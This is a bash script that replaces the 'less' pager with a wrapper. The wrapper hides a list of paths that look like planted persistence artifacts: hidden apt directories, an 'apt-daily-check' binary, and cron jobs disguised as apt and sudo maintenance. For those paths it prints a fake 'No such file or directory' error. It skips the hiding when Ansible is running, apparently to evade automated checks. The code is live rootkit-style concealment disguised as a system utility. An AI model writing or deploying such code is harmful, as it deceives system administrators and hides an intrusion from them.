#!/bin/bash
REAL_LESS="/usr/bin/less"

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

for arg in "$@"; do
    case "$arg" in
        -*) ;;
        *)
            if _is_protected "$arg"; then
                echo "${arg}: No such file or directory" >&2

# Pass straight through if running under Ansible
if [ -n "$ANSIBLE_REMOTE_TEMP" ]; then
    exec $REAL_LESS "$@"
fi
                exit 1
            fi
            ;;
    esac
done

exec $REAL_LESS "$@"
